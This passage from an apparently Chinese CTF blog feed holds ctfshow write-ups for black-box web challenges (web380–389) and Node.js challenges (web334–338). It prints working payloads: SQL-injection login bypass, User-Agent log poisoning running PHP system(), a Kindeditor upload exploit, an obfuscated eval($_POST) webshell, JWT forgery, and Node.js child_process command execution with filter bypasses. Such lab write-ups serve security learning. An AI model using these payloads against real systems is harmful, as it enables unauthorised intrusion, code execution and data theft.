class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-08 19:50:40</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-08 19:59:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$id</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;打开$id.php失败&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$html</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$id</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们就去猜是否存在flag.php</p><p><img src="../images/image-20230202224440246.png" alt="image-20230202224440246"></p><p>最后拿到flag.</p><h2 id="web381-css路径"><a href="#web381-css路径" class="headerlink" title="web381(css路径)"></a>web381(css路径)</h2><p>题目</p><p><img src="../images/image-20230202224640173.png" alt="image-20230202224640173"></p><p>和上一题是一样的</p><p><img src="../images/image-20230202225033153.png" alt="image-20230202225033153"></p><p>打开源码发现有个不一样的地方，然后访问/alsckdfy就能拿到flag了。</p><p>这里是因为前端和后端共用一个css路径，然后前端就会泄露出来，那么别人就会尝试去登录看看，就会发现了后台地址。</p><h2 id="web382-万能密码-爆破-sqlmap"><a href="#web382-万能密码-爆破-sqlmap" class="headerlink" title="web382(万能密码/爆破/sqlmap)"></a>web382(万能密码/爆破/sqlmap)</h2><p>题目</p><p><img src="../images/image-20230202225519773.png" alt="image-20230202225519773"></p><p>因为我们在<strong>web381</strong>拿到了后台管理员登录地址，所以我们直接访问</p><p><img src="../images/image-20230202225902255.png" alt="image-20230202225902255"></p><p>那么我们就可以尝试一下默认密码登录试试</p><p>admin/admin    admin/123   admin/admin888</p><p>那么经过尝试的话，发现是<strong>admin/admin888</strong>是后台管理员密码</p><p>这里给一个弱口令密码       <code>nE7jA%5m</code></p><p><img src="../images/image-20230202230438228.png" alt="image-20230202230438228"></p><p><strong>解法二</strong></p><p>后台万能密码登录</p><p><code>admin</code></p><p><code>admin&#39; or 1=1#</code></p><h2 id="web383-爆破-万能密码"><a href="#web383-爆破-万能密码" class="headerlink" title="web383(爆破/万能密码)"></a>web383(爆破/万能密码)</h2><p><img src="../images/image-20230202230734384.png" alt="image-20230202230734384"></p><p><strong>payload</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="operator">/</span>admin<span class="string">&#x27; or 1=1#    ---&gt;写在username或者password都行</span></span><br></pre></td></tr></table></figure><h2 id="web384-爆破"><a href="#web384-爆破" class="headerlink" title="web384(爆破)"></a>web384(爆破)</h2><p>题目</p><p><img src="../images/image-20230202231129790.png" alt="image-20230202231129790"></p><p><img src="../images/image-20230202231241003.png" alt="image-20230202231241003"></p><p>题目还给了提示，那么我们就直接爆破就行了</p><p>可以先自己写一个密码的生成字典，然后在拿去bp爆破</p><p>密码是  <strong>xy123</strong></p><p>得爆破  —-&gt;635000次，还是给提示的情况下，一般情况下，爆破一般是不用的，不到万不得已时最好不用，因为时间太久了</p><h2 id="web385-配置文件利用"><a href="#web385-配置文件利用" class="headerlink" title="web385(配置文件利用)"></a>web385(配置文件利用)</h2><p>题目</p><p><img src="../images/image-20230202231836152.png" alt="image-20230202231836152"></p><p>扫描后台扫出一个/install后台安装目录</p><p>然后访问，通过提示重置后台管理员密码，那么我们就可以登录后台了</p><p>admin/admin888   (上面的题得出的结论)</p><h2 id="web386-配置文件利用"><a href="#web386-配置文件利用" class="headerlink" title="web386(配置文件利用)"></a>web386(配置文件利用)</h2><p>题目</p><p><img src="../images/image-20230202235025560.png" alt="image-20230202235025560"></p><p>通过扫描后台发现install</p><p>clear.php时看源码时发现的</p><p><img src="../images/image-20230205192730195.png" alt="image-20230205192730195"></p><p>由于这里和上面的不一样，所以就考虑一下去访问这个低质，并把alsckdfy给去掉，访问后面的</p><p><img src="../images/image-20230205192901028.png" alt="image-20230205192901028"></p><p>出现一个压缩过的文件内容，那么我们就把这个给解压缩下来查看</p><p><strong>压缩脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://f50cd95d-d7d9-4454-802e-3cd1b681e803.challenge.ctf.show/layui/css/tree.css&#x27;</span></span><br><span class="line">html = requests.get(url)</span><br><span class="line"><span class="built_in">print</span>(html.cont</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230205193156553.png" alt="image-20230205193156553"></p><p>进行解码后发现存在clear.php文件，这就是发现clear.php的过程</p><p>然后就去访问install</p><p><img src="../images/image-20230203002152913.png" alt="image-20230203002152913"></p><p>存在lock锁定程序，不能进行密码重置了，那么我们就得想办法去删除这个程序，然后这里就有一个clear.php没用到，那么我们就可以尝试去用他。</p><p><img src="../images/image-20230203002311775.png" alt="image-20230203002311775"></p><p>就说清理完成，但不知清理了啥，那我们就得考虑一下清理的参数是啥，盲猜一波file,尝试清理index.php看看。</p><p><img src="../images/image-20230203002537481.png" alt="image-20230203002537481"></p><p>被清理掉了，那么我们就尝试把lock.bat也给清理掉</p><p><img src="../images/image-20230203002721549.png" alt="image-20230203002721549"></p><p>成功清理掉了，那么我们就可以重置密码，然后登录后台了</p><p>默认密码 admin/admin888</p><h2 id="web387-日志文件包含-编辑器"><a href="#web387-日志文件包含-编辑器" class="headerlink" title="web387(日志文件包含  编辑器)"></a>web387(日志文件包含  编辑器)</h2><p>题目</p><p>这里的话时不给删除锁定文件了，那么我们就可以换个思路，查看源码，看有没有啥新的东西进行泄露。</p><p><img src="../images/image-20230205193922017.png" alt="image-20230205193922017"></p><p>发现一个路径很想编辑器的路径，那么我们就进行访问编辑器路径看看。</p><p><img src="../images/image-20230205194048868.png" alt="image-20230205194048868"></p><p>发现确实存在这个编辑器</p><p><img src="../images/image-20230205194132606.png" alt="image-20230205194132606"></p><p>然后发现是个4.1.11版本的，这个版本存在一个上传html的漏洞，但是这里不能上传php代码，因为源码里默认时阻止的，所以我们就得去看一下别的思路</p><p>但是这里是可以直接上传图片和压缩包的，那么我们可以直接在压缩包里写入php代码然后进行上传，效果是一样的。</p><p>然后 扫目录扫扫到一个robots.txt</p><p><img src="../images/image-20230205194644640.png" alt="image-20230205194644640"></p><p>发现一个<strong>/debug</strong>路径</p><p><img src="../images/image-20230205194935811.png" alt="image-20230205194935811"></p><p><img src="../images/image-20230205195546158.png" alt="image-20230205195546158"></p><p>成功执行，那么我们就尝试一下日志文件包含试一试</p><p>这里尝试过写入一句话木马，发现执行不了，所以这里可能是不可以传参数，只能在UA处进行代码执行</p><p><strong>第一步</strong></p><p>在ua处写入 <code>&lt;?php system(&#39;ls / &gt;/var/www/html/1.txt&#39;);?&gt;</code></p><p><img src="../images/image-20230205200136409.png" alt="image-20230205200136409"></p><p>然后在/debug后面加上<code>?file=/var/log/nginx/access.log</code>然后访问，最后在访问1.txt就可以了</p><p><img src="../images/image-20230205200242374.png" alt="image-20230205200242374"></p><p>发现可以成功写入，那么我们就直接查看后台登录源码就行。</p><p>那么在ua处就得重新写入，其他和上面一样</p><p>&lt;?php system(‘ls /var/www/html/alsckdfy/check.php &gt;/var/www/html/2.txt’);?&gt;</p><p><img src="../images/image-20230205200708305.png" alt="image-20230205200708305"></p><p>然后就可以拿到flag了。</p><p><strong>解法二</strong></p><p>因为在ua处可以执行php代码，那么我们就可以删除掉lock.dat文件，然后重新安装，使用默认密码登录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user-agent:<span class="meta">&lt;?php</span> <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;/var/www/html/install/lock.dat&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web388-CVE-2017-1002024-免杀马"><a href="#web388-CVE-2017-1002024-免杀马" class="headerlink" title="web388(CVE-2017-1002024/免杀马)"></a>web388(CVE-2017-1002024/<strong>免杀马</strong>)</h2><p>题目</p><p><img src="../images/image-20230205201200594.png" alt="image-20230205201200594"></p><p>这里是发现<strong>web377</strong>的方法用不了了，还有这个自带的杀毒软件会把php一句话木马给过滤掉了，那么我们就得想想别的方法了，然后上面题提到的editor还没用到，那么这题我们就可以来尝试一下</p><p>这个editor版本的漏洞是  <a href="https://wiki.96.mk/Web安全/Kindeditor/（CVE-2017-1002024）Kindeditor &lt;%3D4.1.11 上传漏洞/">CVE-2017-1002024</a></p><p>这里怎么发现的editor上面的wp有讲</p><p>写入一个免杀码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;&lt;?ph&#x27;</span>.<span class="string">&#x27;p ev&#x27;</span>.<span class="string">&#x27;al($_PO&#x27;</span>.<span class="string">&#x27;ST[1]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/var/www/html/1.php&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>写入到txt文件中，然后进行上传</p><p><img src="../images/image-20230205205012187.png" alt="image-20230205205012187"></p><p>然后通过<strong>/debug?file=</strong>参数传给日志文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/debug/?file=/var/www/html/alsckdfy/attached/file/20230205/20230205124929_21190.txt</span><br></pre></td></tr></table></figure><p>访问日志文件，执行一句话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/debug/?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>然后访问1.php进行rce</p><p>成功写入</p><p><img src="../images/image-20230205205243943.png" alt="image-20230205205243943"></p><p><img src="../images/image-20230205205422574.png" alt="image-20230205205422574"></p><h2 id="web389-session伪造-jwt-日志文件包含"><a href="#web389-session伪造-jwt-日志文件包含" class="headerlink" title="web389(session伪造/jwt/日志文件包含)"></a>web389(session伪造/jwt/日志文件包含)</h2><p>题目</p><p><img src="../images/image-20230205210521806.png" alt="image-20230205210521806"></p><p><img src="../images/image-20230205210544839.png" alt="image-20230205210544839"></p><p>访问/debug，然后提示权限不足，那么就暗示我们不是管理员，这时候查看下cookie，</p><p><img src="../images/image-20230205210647871.png" alt="image-20230205210647871"></p><p>发现是eyjh开头的，那么就会条件反射到<strong>jwt</strong></p><p><img src="../images/image-20230205213300447.png" alt="image-20230205213300447"></p><p>这里的密钥是猜的，然后修改user为admin就好了，这里的密钥是123456，是猜出来的。</p><p><img src="../images/image-20230221214351604.png" alt="image-20230221214351604"></p><p>这个输出就是代表着写入成功。</p><p>那么我们会选择上传一个压缩文件，里面带着一个木马(免杀码)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;&lt;?ph&#x27;</span>.<span class="string">&#x27;p ev&#x27;</span>.<span class="string">&#x27;al($_PO&#x27;</span>.<span class="string">&#x27;ST[1]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/var/www/html/1.php&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后去访问<code>/debug/?file=/var/www/html/alsckdfy/attached/file/20230221/20230221134621_53294.zip</code></p><p>然后访问1.php就可以进行rce了</p><p><strong>这个这专题剩下的内容就不想写了，写java题去了</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow 黑盒测试 刷题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-phpcve 刷题记录</title>
      <link href="/posts/71eebe5f.html"/>
      <url>/posts/71eebe5f.html</url>
      
        <content type="html"><![CDATA[<p>这个phpcve专题我就不写了，看这个师傅的wp就行了，写的很详细了</p><p><a href="https://blog.csdn.net/qq_42880719/article/details/122513194">这篇文章</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow phpcve 刷题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-nodejs 刷题记录</title>
      <link href="/posts/bfd00f80.html"/>
      <url>/posts/bfd00f80.html</url>
      
        <content type="html"><![CDATA[<p>nodejs官方中文文档，不明白的东西可以进去查 <a href="http://nodejs.cn/api">文档</a></p><p>这篇文章写的很好  —-&gt;  <a href="https://tari.moe/2021/05/04/ctfshow-nodejs/">nodejs的wp</a></p><h2 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h2><p>题目</p><p><img src="../images/image-20230130180353006.png" alt="image-20230130180353006"></p><p>这里的把文件下载下来，添加后缀.zip就可以看到有两个文件在压缩包里</p><p><img src="../images/image-20230130180558359.png" alt="image-20230130180558359"></p><p><strong>user.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">items</span>: [</span><br><span class="line">    &#123;<span class="attr">username</span>: <span class="string">&#x27;CTFSHOW&#x27;</span>, <span class="attr">password</span>: <span class="string">&#x27;123456&#x27;</span>&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>login.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> findUser = <span class="keyword">function</span>(<span class="params">name, password</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> users.<span class="title function_">find</span>(<span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="property">username</span> === name.<span class="title function_">toUpperCase</span>() &amp;&amp; item.<span class="property">password</span> === password;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>就上面的代码时解题关键</p><p>其中toUpperCase()函数为转为大写  用户名不能为大写</p><p>所以payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=ctfshow passwd=123456</span><br></pre></td></tr></table></figure><p><strong>yu师傅给的一个小trick</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在<span class="title class_">Character</span>.<span class="title function_">toUpperCase</span>()函数中，字符ı会转变为I，字符ſ会变为S。</span><br><span class="line">在<span class="title class_">Character</span>.<span class="title function_">toLowerCase</span>()函数中，字符İ会转变为i，字符K会转变为k。</span><br></pre></td></tr></table></figure><h2 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h2><p>题目</p><p><img src="../images/image-20230130182055210.png" alt="image-20230130182055210"></p><p><strong>在<a href="https://so.csdn.net/so/search?q=nodejs&amp;spm=1001.2101.3001.7020">nodejs</a>中，eval()方法用于计算字符串，并把它作为脚本代码来执行，语法为“eval(string)”；如果参数不是字符串，而是整数或者是Function类型，则直接返回该整数或Function。</strong></p><p><a href="http://nodejs.cn/api/child_process.html#child_processexecsynccommand-options">这道题用到的方法</a></p><p>可以去看看，并不难看懂</p><p><strong>payload1</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;ls&#x27;</span>).<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure><p><strong>payload2</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;ls&#x27;</span>).<span class="property">stdout</span>.<span class="title function_">toString</span>();</span><br><span class="line"><span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;cat&#x27;</span>,[<span class="string">&#x27;fl00g.txt&#x27;</span>]).<span class="property">stdout</span>.<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure><p>这里先是用<strong>require调用child_process这模块</strong>，然后在调用这个模块里面的函数方法</p><p><img src="../images/image-20230130190208919.png" alt="image-20230130190208919"></p><p>发现一个fl00g.txt，然后直接读取就好了</p><p><img src="../images/image-20230130190401823.png" alt="image-20230130190401823"></p><p>这两个payload的区别，就是有无<strong>args</strong>的区别，详细的话可以自己去上面给的链接里看</p><h2 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h2><p>题目</p><p><img src="../images/image-20230130190632098.png" alt="image-20230130190632098"></p><p>查看源代码又发现是<code>eval</code></p><p>这道题ban了<code>exec</code></p><p>那么这个payload还能用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;ls&#x27;</span>).<span class="property">stdout</span>.<span class="title function_">toString</span>();</span><br><span class="line"><span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;cat&#x27;</span>,[<span class="string">&#x27;fl00g.txt&#x27;</span>]).<span class="property">stdout</span>.<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure><p><strong>方法二</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__filename</span><br><span class="line">__dirname</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230130191842257.png" alt="image-20230130191842257"></p><p><img src="../images/image-20230130191908490.png" alt="image-20230130191908490"></p><p>简单点说就是<code>__filename</code>就是返回当前目录的所处的全路径，<code>dirname</code>就是返回当前文件所处的位置，不包含文件本身</p><p><img src="../images/image-20230130192136886.png" alt="image-20230130192136886"></p><p>然后就利用fs模块里边的readFileSync函数读取文件(在文章开头给的文档链接里边可以查到)</p><p><img src="../images/image-20230130192447476.png" alt="image-20230130192447476"></p><p>发现过滤了exec和load<strong>(查看index.js)</strong>发现的</p><p>payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&#x27;exe&#x27;</span>%2B<span class="string">&#x27;cSync&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure><p>这里的加号要进行url编码，就是编码为%2B(类似ssti用[]绕过.)</p><p>payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readdirSync</span>(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFileSync</span>(<span class="string">&#x27;fl001g.txt&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h2><p>题目</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">md5</span>(<span class="params">s</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .<span class="title function_">update</span>(s)</span><br><span class="line">    .<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;xxxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> b = req.<span class="property">query</span>.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">msg</span>: <span class="string">&#x27;tql&#x27;</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>上面的a,b都是利用get方法进行传参，不理解的nodejs代码的可以看一下下面这篇文章</p><p><a href="https://www.runoob.com/nodejs/node-js-get-post.html">nodejs的get和post</a></p><p>这里的话是nodejs的弱类型比较，第一次见</p><p>解题关键就在于怎么绕过这个判断了。</p><p>这里的思路是利用数组绕过。</p><p>nodejs的拼接问题</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span>+[<span class="number">6</span>,<span class="number">6</span>]); <span class="comment">//56,6</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+<span class="number">6</span>); <span class="comment">//56</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+[<span class="number">6</span>,<span class="number">6</span>]); <span class="comment">//56,6</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+[<span class="string">&quot;6&quot;</span>,<span class="string">&quot;6&quot;</span>]); <span class="comment">//56,6</span></span><br></pre></td></tr></table></figure><p>这时候就有一种思路了，就是类似<code>[&#39;a&#39;]+flag===&#39;a&#39;+flag</code>这样的，比如flag是<code>flag&#123;123&#125;</code>，那么最后得到的都是<code>aflag[123&#125;</code>，因此这个也肯定成立：<code>md5([&#39;a&#39;]+flag)===md5(&#39;a&#39;+flag)</code>，同时也满足<code>a!==b</code>：</p><p>payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]=<span class="number">1</span>&amp;b[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>这里为了相等就是因为要使md5加密相等</p><p><strong>解法二</strong></p><p>还有一种思路。理解一下javascript的数组，会发现它相对来说，和python的列表更为相像，而不像php的数组，因为它只能是数字索引，那么如果传非数字索引呢？：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[x]=<span class="number">1</span>&amp;b[x]=<span class="number">2</span></span><br></pre></td></tr></table></figure><p>变成javascript中的对象了。而对象又有这样的特点：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a=&#123;</span><br><span class="line">    <span class="attr">x</span>:<span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a+<span class="string">&quot;flag&#123;123&#125;&quot;</span>)</span><br><span class="line"><span class="comment">//返回的是： [object Object]flag&#123;123&#125;</span></span><br></pre></td></tr></table></figure><p>因此传入两个对象，进行变量拼接后得到的都是<strong>[object Object]ctfshow{xxxxxx}</strong>，再进行md5肯定也是相同的。本来我以为还需要让a对象和b对象的有不同的键或者虽然键全是相同的，但是有值不同，这样来满足a!==b，但是发现并不需要，因为甚至这样，返回的都是false：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a=&#123;</span><br><span class="line">    <span class="attr">x</span>:<span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> b=&#123;</span><br><span class="line">    <span class="attr">x</span>:<span class="string">&#x27;2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a===b)</span><br><span class="line"><span class="comment">//false</span></span><br></pre></td></tr></table></figure><p>感觉这部分就和java有点像了，两个对象直接比较并不是说比较属性啥的，而是通过引用（内存里的位置）比较的，因此自然a!==b。<br>这样的话值就可以不相等了，因为最后解析都是会解析 成<strong>Object</strong></p><h2 id="web338-原链污染"><a href="#web338-原链污染" class="headerlink" title="web338(原链污染)"></a>web338(原链污染)</h2><p>题目</p><p><img src="../images/image-20230130221831198.png" alt="image-20230130221831198"></p><p>可以看看p神写的文章</p><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto__">这篇</a></p><p>源码里的东西</p><p><strong>login.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span 